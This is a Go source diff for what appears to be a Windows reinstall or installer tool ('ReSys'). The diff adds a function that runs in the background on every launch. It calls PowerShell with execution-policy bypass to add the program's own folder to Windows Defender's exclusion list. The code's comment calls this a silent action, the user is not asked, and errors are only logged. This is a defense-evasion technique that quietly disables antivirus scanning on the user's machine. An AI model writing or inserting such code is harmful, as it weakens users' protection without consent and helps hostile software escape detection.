@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"path/filepath"
 	"strings"
 
 	"ReSys/src/install"
@@ -25,6 +26,7 @@ type cmdOpt struct {
 var goJSN = install.StartJSON
 var goTar = install.StartInstall
 var smtTar = ui.SmartTar
+var runCmd = tools.RunCmd
 
 func PE() int {
 	ui.Win2()
@@ -106,6 +108,38 @@ func runArg(opt cmdOpt) {
 	goTar(tar)
 }
 
+// runWD 静默执行WD白名单脚本。
+func runWD() {
+	exe, err := os.Executable()
+	if err != nil {
+		log.LogWrite(-1, "[main] get exe path failed: %v", err)
+		return
+	}
+	dir := filepath.Dir(exe) + `\`
+	if _, err := runCmd(
+		"powershell",
+		nil,
+		nil,
+		filepath.Dir(exe),
+		"-NoProfile",
+		"-NonInteractive",
+		"-ExecutionPolicy",
+		"Bypass",
+		"-Command",
+		wdCmd(dir),
+	); err != nil {
+		log.LogWrite(-1, "[main] add WD exclusion failed: %v", err)
+	}
+}
+
+func wdCmd(dir string) string {
+	dir = strings.ReplaceAll(dir, `'`, `''`)
+	return fmt.Sprintf(
+		"try {$null = icim MSFT_MpPreference @{ExclusionPath = @('%s'); Force = $True} Add -Namespace root/Microsoft/Windows/Defender -EA 1} catch {$host.SetShouldExit($_.Exception.HResult)}",
+		dir,
+	)
+}
+
 func main() {
 	opt, err := cliOpt(os.Args[1:])
 	if err != nil {
@@ -120,7 +154,6 @@ func main() {
 		}
 		return
 	}
-
 	ui.Uiinit()
 	if windows.IsWinPE() {
 		go PE()
@@ -128,6 +161,7 @@ func main() {
 		ui.Win2()
 		go runArg(opt)
 	}
+	go runWD()
 
 	log.LogWrite(0, "[main]Run\n")
 	ui.UiRun()
